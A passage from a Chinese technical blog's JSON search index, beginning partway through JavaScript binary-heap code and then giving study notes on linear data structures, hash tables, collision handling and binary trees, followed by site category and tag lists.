this.heap.splice(this.size() - 1, 1) // 判断节点是否有左孩子，因为二叉堆的特性，有右必有左 while (this.getLeftIndex(k) &lt; this.size()) &#123; let j = this.getLeftIndex(k) // 判断是否有右孩子，并且右孩子是否大于左孩子 if (j + 1 &lt; this.size() &amp;&amp; this.heap[j + 1] &gt; this.heap[j]) j++ // 判断父节点是否已经比子节点都大 if (this.heap[k] &gt;= this.heap[j]) break this._swap(k, j) k = j &#125; &#125; _swap(left, right) &#123; let rightValue = this.heap[right] this.heap[right] = this.heap[left] this.heap[left] = rightValue &#125;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"常用线性结构","slug":"数据结构/数据结构-常用(线性结构)","date":"2020-11-14T07:48:00.000Z","updated":"2021-05-03T09:22:42.828Z","comments":true,"path":"2020/11/14/数据结构/数据结构-常用(线性结构)/","link":"","permalink":"https://xuxb.github.io/2020/11/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%B8%B8%E7%94%A8(%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84)/","excerpt":"","text":"数据结构-常用(线性结构)数据结构按照逻辑结构来分类，可分为 线性结构 和 非线性结构 线性结构：数组、链表、栈、队列、串等 非线性结构：多维数组、树、图等 数组（Array）存储方式：在内存中占用连续完整的存储空间，最基本的存储结构之一适用场景：适用于读操作多，写操作少 链表（Linked List）存储方式：在内存中占用非连续完整的存储空间，物理上是非连续、非顺序的，最基本的存储结构之一适用场景：适用于读操作少，写操作多 双向链表（Doubly Linked List）双向链表是链表的一种，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱 栈（Stack）特点：后进先出，有 入栈（push） 和 出栈（pop） 操作，可用数组或链表实现 队列（Queue）特点：先进先出，有 入队（push） 和 出队（pop） 操作，可用数组或链表实现 双端队列：可以同时重队头或队尾执行 入队（push） 和 出队（pop） 操作 散列表（Hash Table）散列表也叫哈希表（hash table），这种数据结构提供了键（Key）和值（value）的映射关系，只要提供 Key，便可高效查找出所匹配的 Value，时间复杂度接近于为 O(1)，基于数组实现，查找快速 哈希函数哈希函数是一种映射关系，根据数据的关键词 Key ，通过一定的函数关系，计算出该元素存储位置的函数 哈希函数是将字符串或其他类型的 Key 转换成数组的下标 index 实现方式： 直接定址法：取关键字或关键字的某个线性函数值为散列地址，即 H(key) = key 或 H(key) = a*key + b 除留余数法：取关键字被某个不大于散列表长度 m 的数 p 求余，得到的作为散列地址，即 H(key) = key % p, p &lt; m 位运算hash: 通过利用各种位运算（常见的是移位和异或）来充分的混合输入元素 平方取中法：先计算出关键字值的平方，然后取平方值中间几位作为散列地址 数字分析法：当关键字的位数大于地址的位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为散列地址 随机数法：选择一个随机函数，把关键字的随机函数值作为它的哈希值 哈希冲突对应不同的关键字可能获得相同的 hash 地址，即 key1≠key2，但是 f(key1)=f(key2)。这种现象就是冲突，而且这种冲突只能尽可能的减少，不能完全避免。因为哈希函数是从关键字集合和地址集合的映像，通常关键字集合比较大，而地址集合的元素仅为哈希表中的地址值。 a. 开放地址法开放地址法是当冲突发生时，使用某种探测技术在散列表中形成一个探测序列。沿此序列逐个单元地查找，直到找到给定的关键字，或者碰到一个开放的地址（即该地址单元为空）为止（若要插入，在探查到开放的地址，则可将待插入的新结点存人该地址单元）。查找时探测到开放的地址则表明表中无待查的关键字，即查找失败 当冲突发生时，使用某种探查(亦称探测)技术在散列表中寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到 b. 二次哈希法再使用一个哈希函数，对产生地址冲突的关键字再次进行哈希计算，获取另一个哈希地址，直到不再产生冲突，这种方法不易产生“二次聚集”，但是增加的计算的时间。 c. 链地址法每个哈希地址对应的一个线性表，将地址相同的记录按序写入链表，这种处理方法如果收到哈希共计，出现大量的哈希冲突，会导致查询的时间复杂度增长，甚至退化为O(n)，为了提高查询效率我们可以使用跳表或者红黑树等结构替换线性表 各数据结构时间复杂度比较 分类 读取 更新 插入 删除 数组 O(1) O(1) O(n) O(n) 链表 O(n) O(1) O(1) O(1) 栈 O(1) O(1) O(1) O(1) 队列 O(1) O(1) O(1) O(1) 散列表 O(1) O(1) O(1) O(1)","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"树","slug":"数据结构/数据结构-树(非线性结构)","date":"2020-11-14T07:48:00.000Z","updated":"2021-05-03T09:21:05.041Z","comments":true,"path":"2020/11/14/数据结构/数据结构-树(非线性结构)/","link":"","permalink":"https://xuxb.github.io/2020/11/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%91(%E9%9D%9E%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84)/","excerpt":"","text":"数据结构-树(线性结构)树是 n 个节点的有限集合，有且仅有一个称为根的节点。当 n &gt; 1 时，其余节点可分为 m 个互不相交的有限集，每一个集合本身又是一个树，并称之为根的子树 二叉树二叉树是数的一种特殊形式，每一个节点最多有 2 个孩子节点（左子节点、右子节点）。 通常可用数组或链表示 二叉树可分为满二叉树和完全二叉树 满二叉树：一个二叉树的所有非叶子节点都存在左右孩子，且所有的叶子节点都在同一层级上完全二叉树：一棵深度为 k 的有 n 个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为 i（1 ≤ i ≤ n）的结点与满二叉树中编号为 i 的结点在二叉树中的位置相同，则称这棵树为完全二叉树 二叉树的遍历方式 遍历方式分两大类：深度优先遍历 和 广度优先遍历 深度优先遍历 前序遍历 中序遍历 后序遍历 广度优先遍历 层序遍历","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}],"categories":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"},{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"},{"name":"面试题","slug":"面试题","permalink":"https://xuxb.github.io/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"HTML","slug":"HTML","permalink":"https://xuxb.github.io/categories/HTML/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"},{"name":"杂项","slug":"杂项","permalink":"https://xuxb.github.io/categories/%E6%9D%82%E9%A1%B9/"},{"name":"浏览器","slug":"浏览器","permalink":"https://xuxb.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"},{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/categories/SVG/"},{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"},{"name":"Sass","slug":"CSS/Sass","permalink":"https://xuxb.github.io/categories/CSS/Sass/"},{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"},{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"},{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"},{"name":"面试题","slug":"面试题","permalink":"https://xuxb.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"},{"name":"HTML","slug":"HTML","permalink":"https://xuxb.github.io/tags/HTML/"},{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"},{"name":"JSONP","slug":"JSONP","permalink":"https://xuxb.github.io/tags/JSONP/"},{"name":"同源策略","slug":"同源策略","permalink":"https://xuxb.github.io/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"},{"name":"server","slug":"server","permalink":"https://xuxb.github.io/tags/server/"},{"name":"nginx","slug":"nginx","permalink":"https://xuxb.github.io/tags/nginx/"},{"name":"Performance","slug":"Performance","permalink":"https://xuxb.github.io/tags/Performance/"},{"name":"性能","slug":"性能","permalink":"https://xuxb.github.io/tags/%E6%80%A7%E8%83%BD/"},{"name":"node","slug":"node","permalink":"https://xuxb.github.io/tags/node/"},{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"},{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/tags/SVG/"},{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"},{"name":"Sass","slug":"Sass","permalink":"https://xuxb.github.io/tags/Sass/"},{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"},{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"},{"name":"cookie","slug":"cookie","permalink":"https://xuxb.github.io/tags/cookie/"},{"name":"数据结构","slug":"数据结构","permalink":"https://xuxb.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}